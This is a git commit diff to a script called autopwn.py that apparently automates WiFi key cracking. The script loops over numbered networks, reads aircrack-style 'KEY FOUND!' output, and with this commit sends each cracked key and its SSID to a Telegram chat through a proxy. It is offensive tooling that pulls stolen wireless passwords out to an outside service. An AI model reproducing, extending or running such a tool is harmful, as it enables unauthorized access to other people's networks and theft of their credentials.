79bf64aaf1d2c00d0f466d1bdb59f80b6aeb89f8
Georgiy Demenchuk <demenchuk.george@mail.ru>
2018-12-22 21:11:06 +0300

    Telegram added

--- autopwn.py
+++ autopwn.py
@@ -1,6 +1,18 @@
-import re
+import telegram, re, time
 from subprocess import Popen, PIPE, STDOUT
+
+TELEGRAM_TOKEN = "TGTOKEN"
+TELEGRAM_CHAT_ID = -1
+#Telegram SOCKS5 PROXY
+
 ssidlist = []
+def TelegramSend(out_string):
+    try:
+        pp = telegram.utils.request.Request(proxy_url="proxy_url",urllib3_proxy_kwargs={'username': 'username','password': 'password'})
+        bot = telegram.Bot(token=TELEGRAM_TOKEN,request=pp)
+        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=out_string)
+    except:
+        print("Can't send Telegram alert, check your internet connection & proxy")
 
 def GetSSID(firsttime,ssid):
     global ssidlist
@@ -12,16 +24,13 @@ def GetSSID(firsttime,ssid):
             buflist.append(list(filter(None,[s.replace(' ', '') for s in line.split("  ")])))
         for item in buflist:
             if  (len(item)) == 4:
-                ssidlist.append(item)
-        
+                ssidlist.append(item)  
     else:
         for item in ssidlist:
             if item[0] == str(ssid):
                 return item[2]    
 
-outputarr = []
 GetSSID(True,"")
-print(GetSSID(False,1))
 
 for i in range (1,89):
     byteinput = str.encode(str(i))
@@ -30,12 +39,14 @@ for i in range (1,89):
     grep_stdout = p.communicate(input=byteinput)[0]
     outputlines = grep_stdout.decode()
     for line in outputlines.splitlines():
+        localessid =  GetSSID(False,i);
+
         if "KEY FOUND!" in line:
             s = line[line.find('KEY FOUND!'):]
-            outputarr.append(s[s.find("[")+len("["):s.rfind("]")])
-            print("RESULT: +")
-        if ("KEY NOT FOUND") in line:
-            print("RESULT: -")
-            
+            localekey = s[s.find("[")+len("["):s.rfind("]")].replace(" ","")
+            TelegramSend("[KEY FOUND]\nSSID: "+localessid+"\nKEY: \""+localekey+"\"")
+            print("[RESULT FOR "+localessid+"] -> KEY FOUND:"+" \'"+localekey+"\"")
 
-print(outputarr)
+        elif ("KEY NOT FOUND") in line:
+            print("[RESULT FOR "+localessid+"] -> KEY NOT FOUND")
+            TelegramSend("[KEY NOT FOUND]\nSSID: "+localessid)
